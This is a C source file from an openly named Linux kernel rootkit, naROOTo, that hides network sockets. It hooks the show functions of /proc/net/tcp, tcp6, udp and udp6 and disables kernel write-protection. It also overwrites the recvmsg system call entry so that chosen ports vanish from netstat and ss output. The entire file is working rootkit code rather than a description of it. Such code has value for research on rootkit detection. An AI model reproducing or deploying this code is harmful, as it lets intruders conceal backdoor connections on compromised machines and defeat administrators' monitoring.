/******************************************************************************
 *
 * Name: hide_socket.c 
 * This file provides all the functionality needed for hiding sockets.
 *
 * IMPORTANT: Do NOT change the include order!
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <net/tcp.h>
#include <net/udp.h>
#include <linux/inet_diag.h>

#include "control.h"
#include "include.h"

/* the original syscalls we are hooking */
asmlinkage int (*original_tcp_show) (struct seq_file * m, void *v);
asmlinkage int (*original_tcp6_show) (struct seq_file * m, void *v);
asmlinkage int (*original_udp_show) (struct seq_file * m, void *v);
asmlinkage int (*original_udp6_show) (struct seq_file * m, void *v);
asmlinkage ssize_t(*original_recvmsg) (int fd, struct user_msghdr __user * msg,
				       unsigned int flags);

/* 
 * multiple call counters (and locks for it) to prevent unhooking
 * system calls/functions while they are still in use
 */
static int recvmsg_call_counter = 0;
static spinlock_t recvmsg_lock;
static unsigned long recvmsg_lock_flags;

static int tcp_show_call_counter = 0;
static spinlock_t tcp_show_lock;
static unsigned long tcp_show_lock_flags;

static int tcp6_show_call_counter = 0;
static spinlock_t tcp6_show_lock;
static unsigned long tcp6_show_lock_flags;

static int udp_show_call_counter = 0;
static spinlock_t udp_show_lock;
static unsigned long udp_show_lock_flags;

static int udp6_show_call_counter = 0;
static spinlock_t udp6_show_lock;
static unsigned long udp6_show_lock_flags;

/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int manipulated_tcp_show(struct seq_file *m, void *v)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock,
			      tcp_show_lock_flags);

	int port;
	struct sock *sk;
	struct inet_sock *inet;
	int retv = 0;

	if (SEQ_START_TOKEN == v) {
		retv = original_tcp_show(m, v);
		goto out;
	}

	sk = (struct sock *)v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	/* check protocol and port */
	if (is_tcp_socket_hidden(port)) {
		ROOTKIT_DEBUG("Hidden socket for TCP port %u", port);
		goto out;
	}

	retv = original_tcp_show(m, v);
 out:
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock,
			      tcp_show_lock_flags);
	return retv;
}

/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int manipulated_tcp6_show(struct seq_file *m, void *v)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(tcp6_show_call_counter, &tcp6_show_lock,
			      tcp6_show_lock_flags);

	int port;
	struct sock *sk;
	struct inet_sock *inet;
	int retv = 0;

	if (SEQ_START_TOKEN == v) {
		retv = original_tcp6_show(m, v);
		goto out;
	}

	sk = (struct sock *)v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	/* check protocol and port */
	if (is_tcp_socket_hidden(port)) {
		ROOTKIT_DEBUG("Hidden socket for TCP6 port %u", port);
		goto out;
	}

	retv = original_tcp6_show(m, v);
 out:
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(tcp6_show_call_counter, &tcp6_show_lock,
			      tcp6_show_lock_flags);
	return retv;
}

/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int manipulated_udp_show(struct seq_file *m, void *v)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock,
			      udp_show_lock_flags);

	int port;
	struct sock *sk;
	struct inet_sock *inet;
	int retv = 0;

	if (SEQ_START_TOKEN == v) {
		retv = original_udp_show(m, v);
		goto out;
	}

	sk = (struct sock *)v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	/* check protocol and port */
	if (is_udp_socket_hidden(port)) {
		ROOTKIT_DEBUG("Hidden socket for UDP port %u", port);
		goto out;
	}

	retv = original_udp_show(m, v);
 out:
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock,
			      udp_show_lock_flags);
	return retv;
}

/*
 * access the port number for udp and if it should be
 * hidden then return 0, else return the original function
 */
static int manipulated_udp6_show(struct seq_file *m, void *v)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(udp6_show_call_counter, &udp6_show_lock,
			      udp6_show_lock_flags);

	int port;
	struct sock *sk;
	struct inet_sock *inet;
	int retv = 0;

	if (SEQ_START_TOKEN == v) {
		retv = original_udp6_show(m, v);
		goto out;
	}

	sk = (struct sock *)v;
	inet = inet_sk(sk);
	port = ntohs(inet->inet_sport);

	/* check protocol and port */
	if (is_udp_socket_hidden(port)) {
		ROOTKIT_DEBUG("Hidden socket for UDP6 port %u", port);
		goto out;
	}

	retv = original_udp6_show(m, v);
 out:
	/* lock and decrease the call counter */
	DECREASE_CALL_COUNTER(udp6_show_call_counter, &udp6_show_lock,
			      udp6_show_lock_flags);
	return retv;
}

/*
 * our custom recvmsg, checks for the port number and hides it from ss
 */
asmlinkage ssize_t
manipulated_recvmsg(int fd, struct user_msghdr __user * msg, unsigned int flags)
{
	/* lock and increase the call counter */
	INCREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock,
			      recvmsg_lock_flags);

	ssize_t retv;
	char *stream;
	struct nlmsghdr *nlh;
	struct inet_diag_msg *idm;
	unsigned int port;
	int i;
	int count;
	int offset;
	int found = 1;

	/* compute the length of original call */
	retv = original_recvmsg(fd, msg, flags);

	nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);

	/* to hold the bytes remaining */
	count = retv;

	while (NLMSG_OK(nlh, count)) {
		if (found == 0)
			nlh = NLMSG_NEXT(nlh, count);

		stream = (char *)nlh;
		idm = NLMSG_DATA(nlh);
		port = ntohs(idm->id.idiag_sport);

		/* check if we need to hide this socket */
		if (is_tcp_socket_hidden(port)) {
			found = 1;
			offset = NLMSG_ALIGN(nlh->nlmsg_len);
			for (i = 0; i < count; ++i)
				stream[i] = stream[i + offset];

			retv -= offset;
		} else
			found = 0;
	}

	/* lock and increase the call counter */
	DECREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock,
			      recvmsg_lock_flags);
	return retv;
}

/*
 * hooks all functions needed to hide sockets
 */
int hook_sockets(void)
{
	/* get the location of the sys_call_table from our sysmap.h file */
	void **sys_call_table = (void *)sysmap_sys_call_table;

	int hooked = 0;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct tcp_seq_afinfo *tcp6_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;
	struct udp_seq_afinfo *udp6_seq = 0;
	struct rb_root root = init_net.proc_net->subdir;
	struct rb_node *node = rb_first(&root);
	struct proc_dir_entry *proc;

	ROOTKIT_DEBUG("Loading socket hiding...\n");

	/* loop all proc entries */
	while (node) {
		proc = rb_entry(node, struct proc_dir_entry, subdir_node);

		if (strcmp(proc->name, "tcp") == 0) {
			tcp_seq = proc->data;
			original_tcp_show = tcp_seq->seq_ops.show;
			tcp_seq->seq_ops.show = manipulated_tcp_show;
			hooked++;
			ROOTKIT_DEBUG("Hooked /proc/net/tcp");
		} else if (strcmp(proc->name, "tcp6") == 0) {
			tcp6_seq = proc->data;
			original_tcp6_show = tcp6_seq->seq_ops.show;
			tcp6_seq->seq_ops.show = manipulated_tcp6_show;
			hooked++;
			ROOTKIT_DEBUG("Hooked /proc/net/tcp6");
		} else if (strcmp(proc->name, "udp") == 0) {
			udp_seq = proc->data;
			original_udp_show = udp_seq->seq_ops.show;
			udp_seq->seq_ops.show = manipulated_udp_show;
			hooked++;
			ROOTKIT_DEBUG("Hooked /proc/net/udp");
		} else if (strcmp(proc->name, "udp6") == 0) {
			udp6_seq = proc->data;
			original_udp6_show = udp6_seq->seq_ops.show;
			udp6_seq->seq_ops.show = manipulated_udp6_show;
			hooked++;
			ROOTKIT_DEBUG("Hooked /proc/net/udp6");
		}

		if (hooked >= 4) {
			break;
		}

		/* go to the next entry */
		node = rb_next(node);
	}

	/* disable the write-protection */
	disable_page_protection();

	/*
	 * keep pointer to original function in original_recvmsg, and
	 * replace the system call in the system call table with
	 * manipulated_recvmsg
	 */
	original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
	sys_call_table[__NR_recvmsg] = (ssize_t *) manipulated_recvmsg;

	/* reenable the write-protection */
	enable_page_protection();

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/*
 * unhooks all functions
 */
void unhook_sockets(void)
{
	int restored = 0;
	struct tcp_seq_afinfo *tcp_seq = 0;
	struct tcp_seq_afinfo *tcp6_seq = 0;
	struct udp_seq_afinfo *udp_seq = 0;
	struct udp_seq_afinfo *udp6_seq = 0;
	struct rb_root root = init_net.proc_net->subdir;
	struct rb_node *node = rb_first(&root);
	struct proc_dir_entry *proc;

	/* get the location of the sys_call_table from our sysmap.h file */
	void **sys_call_table = (void *)sysmap_sys_call_table;

	ROOTKIT_DEBUG("Unloading socket hiding...\n");

	/* loop all proc entries */
	while (node) {
		proc = rb_entry(node, struct proc_dir_entry, subdir_node);

		if (strcmp(proc->name, "tcp") == 0) {
			tcp_seq = proc->data;
			tcp_seq->seq_ops.show = original_tcp_show;
			restored++;
			ROOTKIT_DEBUG("Restored /proc/net/tcp");
		} else if (strcmp(proc->name, "tcp6") == 0) {
			tcp6_seq = proc->data;
			tcp6_seq->seq_ops.show = original_tcp6_show;
			restored++;
			ROOTKIT_DEBUG("Restored /proc/net/tcp6");
		} else if (strcmp(proc->name, "udp") == 0) {
			udp_seq = proc->data;
			udp_seq->seq_ops.show = original_udp_show;
			restored++;
			ROOTKIT_DEBUG("Restored /proc/net/udp");
		} else if (strcmp(proc->name, "udp6") == 0) {
			udp6_seq = proc->data;
			udp6_seq->seq_ops.show = original_udp6_show;
			restored++;
			ROOTKIT_DEBUG("Restored /proc/net/udp6");
		}

		/* lets skip the other entries if we are done */
		if (restored >= 4) {
			break;
		}

		/* go to the next entry */
		node = rb_next(node);
	}

	/* disable the write-protection */
	disable_page_protection();

	/* Return the system call back to original */
	sys_call_table[__NR_recvmsg] = (ssize_t *) original_recvmsg;

	/* reenable the write-protection */
	enable_page_protection();

	/* wait for all processes to exit our functions */
	while (recvmsg_call_counter > 0 || tcp_show_call_counter > 0
	       || udp_show_call_counter > 0 || tcp6_show_call_counter > 0
	       || udp6_show_call_counter > 0)
		msleep(2);

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
}
